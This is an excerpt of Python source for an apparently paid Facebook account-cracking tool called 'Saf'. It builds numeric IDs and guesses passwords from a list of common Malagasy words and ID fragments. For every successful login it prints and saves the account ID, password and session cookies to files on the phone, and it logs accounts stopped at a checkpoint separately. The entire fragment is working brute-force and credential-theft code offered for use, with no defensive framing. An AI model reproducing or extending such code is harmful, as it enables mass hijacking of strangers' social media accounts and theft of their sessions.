		...
		{warna}--------------------------------------------{B}
		Owner : {M}Safidy03{M}
		TOOL NAME : {warna}{P}Saf{P}{warna}
		STATUE : {H}Paid{H}
		Facebook : {bblue}Safidiniana{bblue}
		...
		for psx in user:
		ids=code+psx
		passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy','safidy','Safidy','Fanomezana','fanomezana','Mahefa','mahefa','Sarobidy','sarobidy','Mahamasina','mahamasina','Tiana','tiana','lalaina','Lalaina','Lataka','lataka','lalatiana','Lalatiana','miora','Miora','diamondra','Diamondra','nantenaina','Nantenaina']		Dipto.submit(method_crack,ids,passlist)
		linex()
		...
		print('\r\r \033[1;32m[Saf-OK] '+str(uid)+' | '+pas+'\033[1;37m')
		coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
		print('\033[1;32m [COOKIES] '+coki)
		# Vérifier si le dossier Saf-IDS existe et le créer si nécessaire
		if not os.path.exists("/sdcard/Saf-IDS"):
		os.makedirs("/sdcard/Saf-IDS")
		# Enregistrer dans le fichier Saf-OK.txt
		with open(os.path.join("/sdcard/Saf-IDS", "Saf-OK.txt"), 'a') as f:
		f.write(str(uid)+'|'+pas+'|'+coki+'\n')
		oks.append(str(uid))
		break
		elif 'www.facebook.com' in reqx['error_msg']:
		print('\r\r \033[1;30m[Saf-CP] '+ids+' | '+pas+'\033[1;37m')
		# Enregistrer dans le fichier ITACHI-CP.txt
		with open(os.path.join("/sdcard/Saf-IDS", "Saf-CP.txt"), 'a') as f:
		f.write(ids+'|'+pas+'\n')
		cps.append(ids)
		break
		else:
